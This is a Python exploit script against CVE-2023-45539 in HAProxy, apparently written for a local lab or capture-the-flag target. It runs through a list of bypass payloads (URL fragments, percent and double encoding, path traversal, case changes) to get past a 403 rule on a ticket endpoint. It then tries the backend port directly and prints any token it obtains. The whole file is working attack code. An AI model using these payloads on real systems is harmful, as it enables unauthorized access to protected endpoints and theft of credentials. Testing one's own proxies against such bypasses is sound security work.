#!/usr/bin/env python3
"""
Advanced HAProxy Bypass Testing
Testing different techniques for CVE-2023-45539
"""
import requests
import urllib.parse

base_url = "http://localhost:3000"

def test_bypass_techniques():
    techniques = [
        # Standard fragment bypass
        "/api/v1/get_ticket#",
        "/api/v1/get_ticket#/",
        "/api/v1/get_ticket#test",
        
        # URL encoding variations
        "/api/v1/get_ticket%23",
        "/api/v1/get_ticket%2523",
        
        # Query parameter variations
        "/api/v1/get_ticket?#",
        "/api/v1/get_ticket/?#",
        
        # Path variations
        "/api/v1/get_ticket/#",
        "/api/v1/get_ticket/../get_ticket#",
        
        # Case variations
        "/API/V1/GET_TICKET#",
        "/Api/V1/Get_Ticket#",
        
        # Double encoding
        "/api/v1/get_ticket%2523",
        
        # Unicode variations
        "/api/v1/get_ticket\u0023",
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
        'Accept': 'application/json',
        'Connection': 'close'
    }
    
    print("Testing HAProxy bypass techniques...\n")
    
    for i, path in enumerate(techniques, 1):
        url = base_url + path
        print(f"[{i:2d}] Testing: {path}")
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            print(f"     Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"     ✅ SUCCESS! Response: {response.text[:100]}...")
                return response.text
            elif response.status_code != 403:
                print(f"     ⚠️  Unexpected status: {response.text[:50]}...")
            else:
                print(f"     ❌ Blocked")
                
        except Exception as e:
            print(f"     💥 Error: {e}")
        
        print()
    
    print("❌ All bypass techniques failed")
    return None

def test_direct_backend():
    """Test direct backend access"""
    print("Testing direct backend access (port 5000)...")
    
    try:
        # Try direct access to backend
        response = requests.get("http://localhost:5000/api/v1/get_ticket", timeout=5)
        print(f"Direct backend status: {response.status_code}")
        print(f"Response: {response.text}")
        return response.text if response.status_code == 200 else None
    except Exception as e:
        print(f"Direct backend failed: {e}")
        return None

if __name__ == "__main__":
    print("🔍 HAProxy Bypass Testing Tool\n")
    
    # Test through HAProxy
    result = test_bypass_techniques()
    
    if not result:
        print("Trying direct backend access...")
        result = test_direct_backend()
    
    if result:
        print(f"\n🎉 SUCCESS! Got token: {result}")
    else:
        print("\n💥 All techniques failed")